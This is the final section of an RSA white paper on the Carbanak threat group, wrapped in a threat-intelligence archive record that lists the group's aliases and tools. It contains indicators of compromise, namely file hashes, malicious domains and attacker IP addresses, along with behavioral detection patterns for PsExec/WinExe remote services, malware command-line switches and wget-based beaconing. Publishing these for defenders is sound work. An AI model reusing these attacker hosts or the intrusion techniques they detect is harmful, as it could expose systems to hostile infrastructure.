Indicators|\n|---|---|\n|E3C061FA0450056E30285FD44A74CD2A|slpar.org|\n|370D420948672E04BA8EAC10BFE6FC9C|centos-repo.org|\n|90D4CC6D4B81B8C462F5AA7166FEE6FB|95.215.46.116|\n|F9766140642C24D422E19E9CF35F2827|185.61.148.145|\n|EB87856732236E1AC7E168FE264F1B43|185.61.148.96|\n|B57DC2BC16DFDB3DE55923AEF9A98401|107.181.246.146|\n|B3135736BCFDAB27F891DBE4009A8C80|192.99.14.211|\n|0F1C4A2A795FB58BD3C5724AF6F1F71A|95.215.47.122|\n|209BC26396E838E4B665FE3D1CCF7787|95.215.61.192|\n|6499863D47B68030F0C5FFAFAFFB1344|5.45.179.173|\n|752D245F1026482A967A763DAE184569|185.86.151.174|\n|8B3A91038ECB2F57DE5BBD29848B6DC4|185.165.29.27|\n|AB8BED25F9FF64A4B07BE5D3BC34F26B|185.117.88.97|\n|7393CB0F409F8F51B7745981AC30B8B6|95.215.44.129|\n|C4D746B8E5E8E12A50A18C9D61E01864|185.165.29.26|\n|BD126A7B59D5D1F97BA89A3E71425731||\n|6499863D47B68030F0C5FFAFAFFB1344||\n|752D245F1026482A967A763DAE184569||\n|1BD7D0C3023C55B5DF0201CC5D7BBCE1||\n|C01FD758ABB423C8336EE1BD5035A6C7||\n|BD126A7B59D5D1F97BA89A3E71425731||\n|771FA63231FB42EE97AA17818A53F432||\n|EDCE844A219C7534E6A1E7C77C3CB020||\n|0810D239169A13FC0E2E53FC72D2E5F0||\n|D66E31794836DFD2C344D0BE435C6D12||\n|E3C061FA0450056E30285FD44A74CD2A||\n|A365FD9076AF4D841C84ACCD58287801||\n|9E2E4DF27698615DF92822646DC9E16B||\n|5DDF9683692154986494CA9DD74B588F||\n|F9766140642C24D422E19E9CF35F2827||\n|D406E037F034B89C85758AF1A98110BE||\n|D825FBD90087D2350E89CBF205A1B71C||\n\n\n##### 6. INDICATORS OF COMPROMISE\n**6.1 ATOMIC INDICATORS OF COMPROMISE**\n\n**Host Indicators** **Network Indicators**\n\nE3C061FA0450056E30285FD44A74CD2A slpar.org\n\n370D420948672E04BA8EAC10BFE6FC9C centos-repo.org\n\n90D4CC6D4B81B8C462F5AA7166FEE6FB 95.215.46.116\n\nF9766140642C24D422E19E9CF35F2827 185.61.148.145\n\nEB87856732236E1AC7E168FE264F1B43 185.61.148.96\n\nB57DC2BC16DFDB3DE55923AEF9A98401 107.181.246.146\n\nB3135736BCFDAB27F891DBE4009A8C80 192.99.14.211\n\n0F1C4A2A795FB58BD3C5724AF6F1F71A 95.215.47.122\n\n209BC26396E838E4B665FE3D1CCF7787 95.215.61.192\n\n6499863D47B68030F0C5FFAFAFFB1344 5.45.179.173\n\n752D245F1026482A967A763DAE184569 185.86.151.174\n\n8B3A91038ECB2F57DE5BBD29848B6DC4 185.165.29.27\n\nAB8BED25F9FF64A4B07BE5D3BC34F26B 185.117.88.97\n\n7393CB0F409F8F51B7745981AC30B8B6 95.215.44.129\n\nC4D746B8E5E8E12A50A18C9D61E01864 185.165.29.26\n\nBD126A7B59D5D1F97BA89A3E71425731\n\n6499863D47B68030F0C5FFAFAFFB1344\n\n752D245F1026482A967A763DAE184569\n\n1BD7D0C3023C55B5DF0201CC5D7BBCE1\n\nC01FD758ABB423C8336EE1BD5035A6C7\n\nBD126A7B59D5D1F97BA89A3E71425731\n\n771FA63231FB42EE97AA17818A53F432\n\nEDCE844A219C7534E6A1E7C77C3CB020\n\n0810D239169A13FC0E2E53FC72D2E5F0\n\nD66E31794836DFD2C344D0BE435C6D12\n\nE3C061FA0450056E30285FD44A74CD2A\n\nA365FD9076AF4D841C84ACCD58287801\n\n9E2E4DF27698615DF92822646DC9E16B\n\n5DDF9683692154986494CA9DD74B588F\n\nF9766140642C24D422E19E9CF35F2827\n\nD406E037F034B89C85758AF1A98110BE\n\nD825FBD90087D2350E89CBF205A1B71C\n\n54\n\n\n-----\n\n|Host Indicators|Network Indicators|\n|---|---|\n|C:\\Windows\\SysWOW64\\zh-TW Directory Usage|Outbound SSH over TCP/443|\n|Command Line Arguments Containing “-getfiles,” “-copyfiles,” “-copyself,” “-cleanup” or “http://[0-9] {1,3}\\.”|Outbound HTTP over TCP/443, Direct to IP Address, User-Agent Beginning with “wget” or “go-“|\n|cmd.exe -> qwinsta.exe|Outbound SSH where Client Application and Server Application = “openssh_5.3” or Client Application = Server Application|\n|WindowsCtlMonitor Windows Service||\n|PSEXESVC.EXE, WINEXESVC.EXE in C:\\Windows||\n|/usr/share/man/mann Directory Usage||\n|“ssh,” “sshd,” “auditd” in Non- Standard Directories||\n|Linux System Binary Names Not Associated With RPM Package||\n|Linux Child Processes with a Parent of systemd Not Associated With RPM Package||\n|HKLM\\SYSTEM\\ControlSet001\\ services\\PSEXESVC Registry Entries||\n|HKLM\\SYSTEM\\ControlSet001\\ services\\WINEXESVC Registry Entries||\n|Command Line Arguments Ending in “cmd”||\n|Command Line Arguments Containing “\\\\[a-zA-Z0-9]{3,}”||\n\n\n6.2 Behavioral Indicators of Compromise\n\n**Host Indicators** **Network Indicators**\n\nC:\\Windows\\SysWOW64\\zh-TW Outbound SSH over TCP/443\nDirectory Usage\n\nCommand Line Arguments Outbound HTTP over TCP/443,\nContaining “-getfiles,” “-copyfiles,” Direct to IP Address, User-Agent\n“-copyself,” “-cleanup” or “http://[0-9] Beginning with “wget” or “go-“\n{1,3}\\.”\n\ncmd.exe -> qwinsta.exe Outbound SSH where Client\nApplication and Server Application =\n“openssh_5.3” or Client Application =\nServer Application\n\nWindowsCtlMonitor Windows\nService\n\nPSEXESVC.EXE, WINEXESVC.EXE in\nC:\\Windows\n\n/usr/share/man/mann Directory\nUsage\n\n“ssh,” “sshd,” “auditd” in Non-\nStandard Directories\n\nLinux System Binary Names Not\nAssociated With RPM Package\n\nLinux Child Processes with a Parent\nof systemd Not Associated With\nRPM Package\n\nHKLM\\SYSTEM\\ControlSet001\\\nservices\\PSEXESVC Registry Entries\n\nHKLM\\SYSTEM\\ControlSet001\\\nservices\\WINEXESVC Registry\nEntries\n\nCommand Line Arguments Ending in\n“cmd”\n\nCommand Line Arguments\nContaining “\\\\[a-zA-Z0-9]{3,}”\n\n55\n\n\n-----\n\n##### 7. DIGITAL APPENDIX\nBelow is a list of the files and folders contained within the RSA_IR_\nCARBANAK_Digital_Appendix. While specifically created for RSA\ntechnologies, this Digital Appendix also contains traditional IOCs and\ndescriptive content that can be integrated into third-party technologies,\nsuch as OSQuery, Moloch and SOF-ELK. For RSA NetWitness Suite users,\nthe supplied content is currently available in RSA Live but provided here\nfor custom content creation purposes. All content should be tested before\nfull integration into RSA NetWitness Endpoint, RSA NetWitness Logs and\nPackets, or third-party tools to prevent any adverse effects from unknown\nenvironmental variables.\n\n**RSA_IR_Digital_Appendix.zip File Hash:**\nAD4B3B859FA85957B479D824E19C9957\n\n**RSA_IR_Digital_Appendix.zip Contents:**\n\n                           - **NetWitness_Endpoint**\n\noo tinyp_unique_command_line_arguments.sql\n\noo psexec_winexe_remote_service_creation.sql\n\n                           - **NetWitness_Packets**\n\noo RSA_IR_Carbanak_Domain.csv\n\n**■■** List of Carbanak domains referenced in report\n\noo RSA_IR_Carbanak_Domain.xml\n\noo RSA_IR_Carbanak_IP.csv\n\n**■■** List of Carbanak IPs referenced in report\n\noo RSA_IR_Carbanak_IP.xml\n\noo auditunnel_init.lua\n\n**■■** AUDITUNNEL traffic pattern identification with comments\n\noo gotroj_beacon_parser.lua\n\n**■■** GOTROJ traffic pattern identification with comments\n\n                           - **CARBANAK_Hashset.md5**\n\n**■■** List of Carbanak file hashes referenced in report\n\nRSA and the RSA logo, are registered trademarks or trademarks of Dell Technologies in\nthe United States and other countries. © Copyright 2017 Dell Technologies. All rights reserved.\nPublished in the USA. 10/17 White Paper H16777.\n\nRSA believes the information in this document is accurate as of its publication date.\n\n56\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2017/2017.12.04.The_Shadows_of_Ghosts/paper_the-shadows-of-ghosts-carbanak-report.pdf"
    ],
    "report_names": [
        "paper_the-shadows-of-ghosts-carbanak-report"
    ],
    "threat_actors": [
        {
            "id": "c9617bb6-45c8-495e-9759-2177e61a8e91",
            "created_at": "2022-10-25T15:50:23.405039Z",
            "updated_at": "2025-03-27T02:00:55.462193Z",
            "deleted_at": null,
            "main_name": "Carbanak",
            "aliases": [
                "Carbanak",
                "Anunak"
            ],
            "source_name": "MITRE:Carbanak",
            "tools": [
                "Carbanak",
                "Mimikatz",
                "PsExec",
                "netsh"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "bfded1cf-be73-44f9-a391-0751c9996f9a",
            "created_at": "2022-10-25T15:50:23.337107Z",
            "updated_at": "2025-03-27T02:00:55.445946Z",
            "deleted_at": null,
            "main_name": "FIN7",
            "aliases": [
                "FIN7",
                "GOLD NIAGARA",
                "ITG14",
                "Carbon Spider",
                "ELBRUS",
                "Sangria Tempest"
            ],
            "source_name": "MITRE:FIN7",
            "tools": [
                "Mimikatz",
                "AdFind",
                "JSS Loader",
                "HALFBAKED",
                "REvil",
                "PowerSploit",
                "CrackMapExec",
                "Carbanak",
                "Pillowmint",
                "Cobalt Strike",
                "POWERSOURCE",
                "RDFSNIFFER",
                "SQLRat",
                "Lizar",
                "TEXTMATE",
                "BOOSTWRITE"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "bb8702c5-52ac-4359-8409-998a7cc3eeaf",
            "created_at": "2023-01-06T13:46:38.405479Z",
            "updated_at": "2025-03-27T02:00:02.82533Z",
            "deleted_at": null,
            "main_name": "FIN7",
            "aliases": [
                "JokerStash",
                "ATK32",
                "G0046",
                "Coreid",
                "Carbanak",
                "Sangria Tempest",
                "CARBON SPIDER",
                "GOLD NIAGARA",
                "G0008",
                "ELBRUS",
                "Carbon Spider"
            ],
            "source_name": "MISPGALAXY:FIN7",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d85adfe3-e1c3-40b0-b8bb-d1bacadc4d82",
            "created_at": "2022-10-25T16:07:23.619566Z",
            "updated_at": "2025-03-27T02:02:09.890982Z",
            "deleted_at": null,
            "main_name": "FIN7",
            "aliases": [
                "APT-C-11",
                "ATK 32",
                "Gold Niagara",
                "ITG14",
                "TAG-CR1"
            ],
            "source_name": "ETDA:FIN7",
            "tools": [
                "7Logger",
                "Agentemis",
                "Anunak",
                "Astra",
                "BIOLOAD",
                "BIRDWATCH",
                "Bateleur",
                "Boostwrite",
                "CROWVIEW",
                "Carbanak",
                "Cobalt Strike",
                "CobaltStrike",
                "DICELOADER",
                "DNSMessenger",
                "FOWLGAZE",
                "HALFBAKED",
                "JSSLoader",
                "KillACK",
                "LOADOUT",
                "Lizar",
                "Meterpreter",
                "Mimikatz",
                "POWERPLANT",
                "POWERSOURCE",
                "RDFSNIFFER",
                "SQLRAT",
                "Sekur",
                "Sekur RAT",
                "TEXTMATE",
                "Tirion",
                "VB Flash",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "ed3810b7-141a-4ed0-8a01-6a972b80458d",
            "created_at": "2022-10-25T16:07:23.443259Z",
            "updated_at": "2025-03-27T02:02:09.801771Z",
            "deleted_at": null,
            "main_name": "Carbanak",
            "aliases": [
                "Anunak",
                "Carbanak",
                "Carbon Spider",
                "ELBRUS",
                "Gold Waterfall",
                "Sangria Tempest"
            ],
            "source_name": "ETDA:Carbanak",
            "tools": [
                "AVE_MARIA",
                "Agentemis",
                "AmmyyRAT",
                "Antak",
                "Anunak",
                "Ave Maria",
                "AveMariaRAT",
                "BABYMETAL",
                "BIRDDOG",
                "Backdoor Batel",
                "Batel",
                "Bateleur",
                "BlackMatter",
                "Boostwrite",
                "Cain & Abel",
                "Carbanak",
                "Cl0p",
                "Cobalt Strike",
                "CobaltStrike",
                "DNSMessenger",
                "DNSRat",
                "DNSbot",
                "DRIFTPIN",
                "DarkSide",
                "FOXGRABBER",
                "FlawedAmmyy",
                "HALFBAKED",
                "JS Flash",
                "KLRD",
                "MBR Eraser",
                "Mimikatz",
                "Nadrac",
                "Odinaff",
                "POWERPIPE",
                "POWERSOURCE",
                "PsExec",
                "SQLRAT",
                "Sekur",
                "Sekur RAT",
                "SocksBot",
                "SoftPerfect Network Scanner",
                "Spy.Agent.ORM",
                "TEXTMATE",
                "TeamViewer",
                "TiniMet",
                "TinyMet",
                "Toshliph",
                "VB Flash",
                "WARPRISM",
                "avemaria",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716499,
    "ts_updated_at": 1743041817,
    "ts_creation_date": 1510331534,
    "ts_modification_date": 1510331555,
    "files": {
        "pdf": "https://archive.orkl.eu/3b669818816e3d888b2546bc75ac0f44782f7faf.pdf",
        "text": "https://archive.orkl.eu/3b669818816e3d888b2546bc75ac0f44782f7faf.txt",
        "img": "https://archive.orkl.eu/3b669818816e3d888b2546bc75ac0f44782f7faf.jpg"
    }
}